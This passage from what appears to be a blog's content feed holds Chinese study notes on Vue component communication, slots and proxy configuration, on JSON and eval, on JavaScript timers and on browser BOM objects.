备注</h3><ol><li><p>SessionStorage存储的内容会随着浏览器窗口关闭而消失</p></li><li><p>LocalStorage存储的内容，需要手动清除才会消失</p></li><li><p><code>xxxxxStorage.getItem(xxx)</code>如果xxx对应的value获取不到，那么getItem的返回值是null</p></li><li><p><code>JSON.parse(null)</code>的结果依然是null</p></li></ol><h2 id="二十八、组件的自定义事件"><a href="#二十八、组件的自定义事件" class="headerlink" title="二十八、组件的自定义事件"></a>二十八、组件的自定义事件</h2><h3 id="1-什么是组件自定义事件"><a href="#1-什么是组件自定义事件" class="headerlink" title="1. 什么是组件自定义事件"></a>1. 什么是组件自定义事件</h3><p> 一种组件间通信的方式,适用于: <strong style="color:red">子组件 ===&gt; 父组件</strong></p><h3 id="2-使用场景"><a href="#2-使用场景" class="headerlink" title="2. 使用场景"></a>2. 使用场景</h3><p> A是父组件,B是子组件,B想给A传数据,那么就要在A中给B绑定自定义事件(<span style="color:red">事件的回调在A中</span>)</p><h3 id="3-绑定自定义事件的几种方式"><a href="#3-绑定自定义事件的几种方式" class="headerlink" title="3. 绑定自定义事件的几种方式"></a>3. 绑定自定义事件的几种方式</h3><p> ①第一种方式<br>  在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>  或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p><p> ②第二种方式<br>  在父组件中:<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>Demo ref<span class="token operator">=</span><span class="token string">"demo"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'atguigu'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>test<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><br>  备注: 若想让自定义事件只能触发一次,可以使用<code>once</code>修饰符,或<code>$once</code>方法</p><h3 id="4-触发自定义事件"><a href="#4-触发自定义事件" class="headerlink" title="4. 触发自定义事件"></a>4. 触发自定义事件</h3><p> <code>this.$emit(&#39;atguigu&#39;,数据)</code>    </p><h3 id="5-解绑自定义事件"><a href="#5-解绑自定义事件" class="headerlink" title="5. 解绑自定义事件"></a>5. 解绑自定义事件</h3><p> <code>this.$off(&#39;atguigu&#39;)</code></p><h3 id="6-组件绑定原生事件"><a href="#6-组件绑定原生事件" class="headerlink" title="6. 组件绑定原生事件"></a>6. 组件绑定原生事件</h3><p> 组件上也可以绑定DOM事件,需要<code>native</code>修饰符</p><h3 id="7-注意"><a href="#7-注意" class="headerlink" title="7. 注意"></a>7. 注意</h3><p> 通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p><h2 id="二十九、全局事件总线-GlobalEventBus"><a href="#二十九、全局事件总线-GlobalEventBus" class="headerlink" title="二十九、全局事件总线(GlobalEventBus)"></a>二十九、全局事件总线(GlobalEventBus)</h2><h3 id="1-什么是全局事件总线"><a href="#1-什么是全局事件总线" class="headerlink" title="1. 什么是全局事件总线"></a>1. 什么是全局事件总线</h3><p> 一种组件间通信的方式,适用于<span style="color:red">任意组件间通信</span></p><h3 id="2-安装全局事件总线"><a href="#2-安装全局事件总线" class="headerlink" title="2. 安装全局事件总线"></a>2. 安装全局事件总线</h3><pre class="language-js" data-language="js"><code class="language-js"> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$bus <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//安装全局事件总线，$bus就是当前应用的vm</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> </code></pre><h3 id="3-使用事件总线"><a href="#3-使用事件总线" class="headerlink" title="3. 使用事件总线"></a>3. 使用事件总线</h3><p> ①接收数据<br>  A组件想接收数据,则在A组件中给$bus绑定自定义事件,事件的<span style="color:red">回调留在A组件自身</span></p>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>$bus<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p> ②提供数据<br>  <code>this.$bus.$emit(&#39;xxxx&#39;,数据)</code></p><h3 id="4-何时解绑"><a href="#4-何时解绑" class="headerlink" title="4. 何时解绑"></a>4. 何时解绑</h3><p> 最好在beforeDestroy钩子中,用$off去解绑<span style="color:red">当前组件所用到的</span>事件</p><h2 id="三十、消息订阅与发布-pubsub"><a href="#三十、消息订阅与发布-pubsub" class="headerlink" title="三十、消息订阅与发布(pubsub)"></a>三十、消息订阅与发布(pubsub)</h2><h3 id="1-什么是消息订阅与发布"><a href="#1-什么是消息订阅与发布" class="headerlink" title="1. 什么是消息订阅与发布"></a>1. 什么是消息订阅与发布</h3><p> 一种组件间通信的方式,适用于<span style="color:red">任意组件间通信</span></p><h3 id="2-使用步骤"><a href="#2-使用步骤" class="headerlink" title="2. 使用步骤"></a>2. 使用步骤</h3><p> ①安装pubsub<br>  <code>npm i pubsub-js</code></p><p> ②引入<br>  <code>import pubsub from &#39;pubsub-js&#39;</code></p><p> ③接收数据<br>  A组件想接收数据,则在A组件中订阅消息,订阅的<span style="color:red">回调留在A组件自身</span></p>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">=</span> pubsub<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span> <span class="token comment">//订阅消息</span><span class="token punctuation">&#125;</span></code></pre><p>  ④提供数据<br>   <code>pubsub.publish(&#39;xxx&#39;,数据)</code></p><p>  ⑤取消订阅<br>   最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅</span></p><h2 id="三十一、nextTick"><a href="#三十一、nextTick" class="headerlink" title="三十一、nextTick"></a>三十一、nextTick</h2><h3 id="1-语法"><a href="#1-语法" class="headerlink" title="1. 语法"></a>1. 语法</h3><p> <code>this.$nextTick(回调函数)</code></p><h3 id="2-作用"><a href="#2-作用" class="headerlink" title="2. 作用"></a>2. 作用</h3><p> 在下一次 DOM 更新结束后执行其指定的回调</p><h3 id="3-何时使用"><a href="#3-何时使用" class="headerlink" title="3. 何时使用"></a>3. 何时使用</h3><p> 当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行</p><h2 id="三十二、Vue封装的过度与动画"><a href="#三十二、Vue封装的过度与动画" class="headerlink" title="三十二、Vue封装的过度与动画"></a>三十二、Vue封装的过度与动画</h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> 在插入、更新或移除DOM元素时,在合适的时候给元素添加样式类名</p><h3 id="2-写法"><a href="#2-写法" class="headerlink" title="2. 写法"></a>2. 写法</h3><h4 id="1-准备样式"><a href="#1-准备样式" class="headerlink" title="1.准备样式"></a>1.准备样式</h4><p>  ①进入的样式<br>    Ⅰ. v-enter: 进入的起点<br>    Ⅱ.v-enter-active: 进入的过程中<br>    Ⅲ. v-enter-to: 进入的终点</p><p>  ②离开的样式<br>    Ⅰ. v-leave: 离开的起点<br>    Ⅱ.v-leave-active: 离开的过程中<br>    Ⅲ. v-leave-to: 离开的终点</p><h4 id="2-包裹过度元素"><a href="#2-包裹过度元素" class="headerlink" title="2.包裹过度元素"></a>2.包裹过度元素</h4><p> 使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>transition name<span class="token operator">=</span><span class="token string">"hello"</span><span class="token operator">></span> <span class="token operator">&lt;</span>h1 v<span class="token operator">-</span>show<span class="token operator">=</span><span class="token string">"isShow"</span><span class="token operator">></span>你好啊！<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>transition<span class="token operator">></span></code></pre><h4 id="3-备注-1"><a href="#3-备注-1" class="headerlink" title="3.备注"></a>3.备注</h4><p> 若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值</p><h2 id="三十三、Vue脚手架配置代理"><a href="#三十三、Vue脚手架配置代理" class="headerlink" title="三十三、Vue脚手架配置代理"></a>三十三、Vue脚手架配置代理</h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a>1.方法一</h3><p> 在<code>vue.config.js</code>中添加如下配置：<br> <pre class="language-js" data-language="js"><code class="language-js">devServer<span class="token operator">:</span><span class="token punctuation">&#123;</span> proxy<span class="token operator">:</span><span class="token string">"http://localhost:5000"</span><span class="token punctuation">&#125;</span></code></pre></p><p> 说明:<br>  ①优点<br>   配置简单,请求资源时直接发给前端(8080)即可</p><p>  ②缺点<br>   不能配置多个代理,不能灵活的控制请求是否走代理</p><p>  ③工作方式<br>   若按照上述配置代理,当请求了前端不存在的资源时,那么该请求会转发给服务器(优先匹配前端资源)</p><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a>2.方法二</h3><p> 在<code>vue.config.js</code>配置具体代理规则:<br> <pre class="language-js" data-language="js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  devServer<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      proxy<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string">'/api1'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 匹配所有以 '/api1'开头的请求路径</span>        target<span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        pathRewrite<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">'^/api1'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token string">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 匹配所有以 '/api2'开头的请求路径</span>        target<span class="token operator">:</span> <span class="token string">'http://localhost:5001'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        pathRewrite<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">'^/api2'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*  changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000  changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080  changeOrigin默认值为true*/</span></code></pre><br>  说明:<br>   ①优点<br>    可以配置多个代理,且可以灵活的控制请求是否走代理</p><p>   ②缺点<br>    配置略微繁琐,请求资源时必须加前缀</p><h2 id="三十四、插槽"><a href="#三十四、插槽" class="headerlink" title="三十四、插槽"></a>三十四、插槽</h2><h3 id="1-作用-1"><a href="#1-作用-1" class="headerlink" title="1.作用"></a>1.作用</h3><p> 让父组件可以向子组件指定位置插入html结构,也是一种组件间通信的方式,适用于1. <strong style="color:red">父组件 ===&gt; 子组件</strong> </p><h3 id="2-分类-1"><a href="#2-分类-1" class="headerlink" title="2.分类"></a>2.分类</h3><p> ①默认插槽<br> ②具名插槽<br> ③作用域插槽</p><h4 id="1-默认插槽"><a href="#1-默认插槽" class="headerlink" title="1. 默认插槽"></a>1. 默认插槽</h4> <pre class="language-js" data-language="js"><code class="language-js">父组件中：       <span class="token operator">&lt;</span>Category<span class="token operator">></span>          <span class="token operator">&lt;</span>div<span class="token operator">></span>html结构<span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>       <span class="token operator">&lt;</span><span class="token operator">/</span>Category<span class="token operator">></span>子组件中：       <span class="token operator">&lt;</span>template<span class="token operator">></span>           <span class="token operator">&lt;</span>div<span class="token operator">></span>              <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 定义插槽 <span class="token operator">--</span><span class="token operator">></span>              <span class="token operator">&lt;</span>slot<span class="token operator">></span>插槽默认内容<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>slot<span class="token operator">></span>           <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>       <span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span></code></pre><h4 id="2-具名插槽"><a href="#2-具名插槽" class="headerlink" title="2. 具名插槽"></a>2. 具名插槽</h4> <pre class="language-js" data-language="js"><code class="language-js">父组件中：       <span class="token operator">&lt;</span>Category<span class="token operator">></span>           <span class="token operator">&lt;</span>template slot<span class="token operator">=</span><span class="token string">"center"</span><span class="token operator">></span>             <span class="token operator">&lt;</span>div<span class="token operator">></span>html结构<span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>           <span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span>           <span class="token operator">&lt;</span>template v<span class="token operator">-</span>slot<span class="token operator">:</span>footer<span class="token operator">></span>              <span class="token operator">&lt;</span>div<span class="token operator">></span>html结构<span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>           <span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span>       <span class="token operator">&lt;</span><span class="token operator">/</span>Category<span class="token operator">></span>子组件中：       <span class="token operator">&lt;</span>template<span class="token operator">></span>           <span class="token operator">&lt;</span>div<span class="token operator">></span>              <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 定义插槽 <span class="token operator">--</span><span class="token operator">></span>              <span class="token operator">&lt;</span>slot name<span class="token operator">=</span><span class="token string">"center"</span><span class="token operator">></span>插槽默认内容<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>slot<span class="token operator">></span>              <span class="token operator">&lt;</span>slot name<span class="token operator">=</span><span class="token string">"footer"</span><span class="token operator">></span>插槽默认内容<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>slot<span class="token operator">></span>           <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>       <span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span></code></pre><h4 id="3-作用域插槽"><a href="#3-作用域插槽" class="headerlink" title="3. 作用域插槽"></a>3. 作用域插槽</h4><p> 1.理解<br>  <span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p> <pre class="language-js" data-language="js"><code class="language-js">父组件中：<span class="token operator">&lt;</span>Category<span class="token operator">></span><span class="token operator">&lt;</span>template scope<span class="token operator">=</span><span class="token string">"scopeData"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 生成的是ul列表 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"g in scopeData.games"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"g"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>Category<span class="token operator">></span>子组件中：       <span class="token operator">&lt;</span>template<span class="token operator">></span>           <span class="token operator">&lt;</span>div<span class="token operator">></span>               <span class="token operator">&lt;</span>slot <span class="token operator">:</span>games<span class="token operator">=</span><span class="token string">"games"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>slot<span class="token operator">></span>           <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>       <span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span>       <span class="token operator">&lt;</span>script<span class="token operator">></span>           <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>               name<span class="token operator">:</span><span class="token string">'Category'</span><span class="token punctuation">,</span>               props<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               <span class="token comment">//数据在子组件自身</span>               <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                   <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>                       games<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'红色警戒'</span><span class="token punctuation">,</span><span class="token string">'穿越火线'</span><span class="token punctuation">,</span><span class="token string">'劲舞团'</span><span class="token punctuation">,</span><span class="token string">'超级玛丽'</span><span class="token punctuation">]</span>                   <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>           <span class="token punctuation">&#125;</span>       <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十九篇博客</title>
      <link href="/2021/11/27/di-san-shi-jiu-pian-bo-ke/"/>
      <url>/2021/11/27/di-san-shi-jiu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="JSON的初体验"><a href="#JSON的初体验" class="headerlink" title="JSON的初体验"></a>JSON的初体验</h1><a id="more"></a><h2 id="一、JSON"><a href="#一、JSON" class="headerlink" title="一、JSON"></a>一、JSON</h2><h3 id="1-什么是JSON"><a href="#1-什么是JSON" class="headerlink" title="1.什么是JSON"></a>1.什么是JSON</h3><p> ①JS中的对象只有JS自己认识,其他的语言不认识</p><p> ②JSON就是一个特殊格式的字符串,这个字符串可以被任意的语言所识别,并且可以转换为任意语言中的对象,JSON在开发中主要用来数据的交互</p><h3 id="2-JSON与js"><a href="#2-JSON与js" class="headerlink" title="2.JSON与js"></a>2.JSON与js</h3><p> JSON(JavaScript Object Notation),JS对象表示法,JSON和JS对象的格式一样,只不过JSON字符串中的属性名必须加双引号,其他的语法和JS一致</p><h3 id="3-JSON的分类"><a href="#3-JSON的分类" class="headerlink" title="3.JSON的分类"></a>3.JSON的分类</h3><p> ①对象{}<br> ②数组[]</p><h3 id="4-JSON中允许的值"><a href="#4-JSON中允许的值" class="headerlink" title="4.JSON中允许的值"></a>4.JSON中允许的值</h3><p> ①字符串<br> ②数值<br> ③布尔值<br> ④null<br> ⑤对象(普通对象,不包含函数对象)<br> ⑥数组</p><h3 id="5-方法"><a href="#5-方法" class="headerlink" title="5.方法"></a>5.方法</h3><p> ①将JSON字符串转换为JS中的对象,在JS中,为我们提供了一个工具类,就叫JSON.这个对象可以帮助我们将一个JSON转换为JS对象,也可以将一个JS对象转换为JSON</p><h4 id="1-JSON转为JS对象"><a href="#1-JSON转为JS对象" class="headerlink" title="1.JSON转为JS对象"></a>1.JSON转为JS对象</h4><p> JSON.parse() 它可以将JSON字符串转换为JS对象,需要一个JSON字符串作为参数,会将该字符串转换为JS对象并返回</p><h4 id="2-JS对象转为JSON"><a href="#2-JS对象转为JSON" class="headerlink" title="2.JS对象转为JSON"></a>2.JS对象转为JSON</h4><p> JSON.stringify() 可以将一个JS对象转换为JSON字符串,需要一个JS对象作为参数,会返回一个JSON字符串</p><h3 id="6-eval"><a href="#6-eval" class="headerlink" title="6.eval"></a>6.eval</h3><p> ①该函数可以用来执行一段字符串形式的JS代码,并将执行结果返回</p><p> ②如果使用eval()执行的字符串中含有{},它会将{}当成是代码块</p><p> ③如果不希望将其当成代码块解析,则需要在字符串前后各加一个()<br> 例如:<br>  var str = ‘{“name”:”孙悟空”}’</p><p>  var obj = eval(“(“+str+”)”)<br>  前后加上括号,这样就不会当成代码块来解析了</p><p> ④eval() 这个函数的功能很强大,可以直接执行一个字符串中的js代码,但是在开发中尽量不要使用,首先它的执行性能比较差,然后它还具有安全隐患</p>]]></content>
      
      
      
        <tags>
            
            <tag> -JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十八篇博客</title>
      <link href="/2021/11/27/di-san-shi-ba-pian-bo-ke/"/>
      <url>/2021/11/27/di-san-shi-ba-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十九天-定时器"><a href="#学习JavaScript的第十九天-定时器" class="headerlink" title="学习JavaScript的第十九天(定时器)"></a>学习JavaScript的第十九天(定时器)</h1><a id="more"></a><h2 id="一、定时器"><a href="#一、定时器" class="headerlink" title="一、定时器"></a>一、定时器</h2><h3 id="1-定时器"><a href="#1-定时器" class="headerlink" title="1.定时器"></a>1.定时器</h3><p> 如果希望一段程序,可以每间隔一段时间执行,可以使用定时调用</p><h3 id="2-定时调用-定时器"><a href="#2-定时调用-定时器" class="headerlink" title="2.定时调用(定时器)"></a>2.定时调用(定时器)</h3><p> setInterval()<br> ①该方法可以将一个函数,每隔一段时间执行一次</p><p> ②参数<br>  Ⅰ.第一个参数回调函数,该函数会每隔一段时间被调用一次<br>  Ⅱ.第二个参数每次调用间隔的时间,单位是毫秒</p><p> ③返回值<br>  返回一个number类型的数据,这个数值作为定时器的唯一标识</p><h3 id="3-关闭定时器"><a href="#3-关闭定时器" class="headerlink" title="3.关闭定时器"></a>3.关闭定时器</h3><p> clearInterval()<br> ①该方法可以用来关闭一个定时器</p><p> ②方法中需要一个定时器的标识作为参数,这样将关闭标识对应的定时器</p><p> ③可以接收任意参数(null、undefined)</p><p> ④如果参数是一个定时器的标识,就停止对应的定时器.如果参数不是一个有效的标识,就什么都不做</p><p><img src="/js/js157.png"></p><h2 id="二、延时调用"><a href="#二、延时调用" class="headerlink" title="二、延时调用"></a>二、延时调用</h2><h3 id="1-延时调用"><a href="#1-延时调用" class="headerlink" title="1.延时调用"></a>1.延时调用</h3><p> 延时调用一个函数不马上执行,而是隔一段时间以后再执行,而且只会执行一次</p><h3 id="2-与定时调用区别"><a href="#2-与定时调用区别" class="headerlink" title="2.与定时调用区别"></a>2.与定时调用区别</h3><p> 延时调用与定时调用的区别,定时调用可以执行多次,而延时调用只会执行一次</p><h3 id="3-开发选择"><a href="#3-开发选择" class="headerlink" title="3.开发选择"></a>3.开发选择</h3><p> 延时调用和定时调用实际上是可以互相替代的,在开发中可以根据自己需要去选择</p><p><img src="/js/js158.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十七篇博客</title>
      <link href="/2021/11/26/di-san-shi-qi-pian-bo-ke/"/>
      <url>/2021/11/26/di-san-shi-qi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十八天-BOM"><a href="#学习JavaScript的第十八天-BOM" class="headerlink" title="学习JavaScript的第十八天(BOM)"></a>学习JavaScript的第十八天(BOM)</h1><a id="more"></a><h2 id="一、BOM-浏览器对象模型"><a href="#一、BOM-浏览器对象模型" class="headerlink" title="一、BOM(浏览器对象模型)"></a>一、BOM(浏览器对象模型)</h2><p> ①BOM可以使我们通过JS来操作浏览器<br> ②在BOM中为我们提供了一组对象,用来完成对浏览器的操作</p><h2 id="二、BOM对象"><a href="#二、BOM对象" class="headerlink" title="二、BOM对象"></a>二、BOM对象</h2><h3 id="1-Window"><a href="#1-Window" class="headerlink" title="1.Window"></a>1.Window</h3><p> ①代表的是整个浏览器的窗口,同时window也是网页中的全局对象</p><h3 id="2-Navigator"><a href="#2-Navigator" class="headerlink" title="2.Navigator"></a>2.Navigator</h3><p> ①代表的是当前浏览器的信息,通过对该对象可以来识别不同的浏览器</p><h3 id="3-Location"><a href="#3-Location" class="headerlink" title="3.Location"></a>3.Location</h3><p> ①代表当前浏览器的地址栏信息,通过Location可以获取地址栏信息,或者操作浏览器跳转页面</p><h3 id="4-History"><a href="#4-History" class="headerlink" title="4.History"></a>4.History</h3><p> ①代表浏览器的历史记录,可以通过该对象来操作浏览器的历史记录.由于隐私原因,该对象不能获取到具体的历史记录,只能操作浏览器向前或向后翻页,而且该操作只在当次访问有效</p><h3 id="5-Screen"><a href="#5-Screen" class="headerlink" title="5.Screen"></a>5.Screen</h3><p> 代表用户的屏幕信息,通过该对象可以获取到用户的显示器的相关信息</p><p>这些BOM对象在浏览器中都是作为window对象的属性保存的,可以通过window对象来使用,也可以直接使用</p><h2 id="三、Navigator"><a href="#三、Navigator" class="headerlink" title="三、Navigator"></a>三、Navigator</h2><p> ①代表当前浏览器的信息,通过该对象可以识别不同的浏览器</p><p> ②由于历史原因,Navigator对象中的大部分属性都已经不能帮助我们识别浏览器了</p><p> ③一般使用userAgent(用户代理)来判断浏览器的信息,userAgent是一个字符串,这个字符串中包含有用来描述浏览器信息的内容,不同的浏览器会有不同的userAgent</p><p> ④如果通过UserAgent不能判断,还可以通过一些浏览器中特有的对象,来判断浏览器的信息.比如:ActiveXObject</p><p><img src="/js/js154.png"></p><h2 id="四、History"><a href="#四、History" class="headerlink" title="四、History"></a>四、History</h2><h3 id="1-该对象可以用来操作浏览器向前或向后翻页"><a href="#1-该对象可以用来操作浏览器向前或向后翻页" class="headerlink" title="1.该对象可以用来操作浏览器向前或向后翻页"></a>1.该对象可以用来操作浏览器向前或向后翻页</h3><h3 id="2-属性"><a href="#2-属性" class="headerlink" title="2.属性"></a>2.属性</h3><p> length 可以获取到当次访问的链接数量(也可以理解成访问了几个页面)</p><h3 id="3-方法"><a href="#3-方法" class="headerlink" title="3.方法"></a>3.方法</h3><p> ①back<br>   可以用来回退到上一个页面,作用和浏览器的回退按钮一样</p><p> ②forward<br>   可以跳转下一个页面,作用和浏览器的前进按钮一样</p><p> ③go<br>   可以用来跳转到指定页面,它需要一个整数作为参数</p><p> 1表示向前跳转一个页面(相当于forward) 2表示向前跳转两个页面<br> -1表示向后跳转一个页面 -2表示向后跳转两个页面</p><p><img src="/js/js155.png"></p><h2 id="五、Location"><a href="#五、Location" class="headerlink" title="五、Location"></a>五、Location</h2><h3 id="1-location"><a href="#1-location" class="headerlink" title="1.location"></a>1.location</h3><p> ①该对象中封装了浏览器的地址栏信息</p><p> ②如果直接打印location,可以获取到地址栏的信息(当前页面的完整路径)</p><p> ③如果直接将location属性修改为一个完整的路径,或相对路径,则我们的页面将会自动跳转到该页面,并且会生成相应的历史记录</p><h3 id="2-方法"><a href="#2-方法" class="headerlink" title="2.方法"></a>2.方法</h3><p> ①assign<br>  assign() 用来跳转到其他页面,作用和直接修改location一样</p><p> ②reload() 用于重新加载当前页面,作用和刷新一样.如果方法中传递一个true作为参数,则会强制清空缓存刷新页面</p><p> ③replace() 可以使用一个新的页面替换当前页面,调用完毕后会跳转页面,不会生成历史记录,不能使用回退按钮回退(替换没有生成历史记录)</p><p><img src="/js/js156.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十六篇博客</title>
      <link href="/2021/11/15/di-san-shi-liu-pian-bo-ke/"/>
      <url>/2021/11/15/di-san-shi-liu-pian-bo-ke/</url>
      
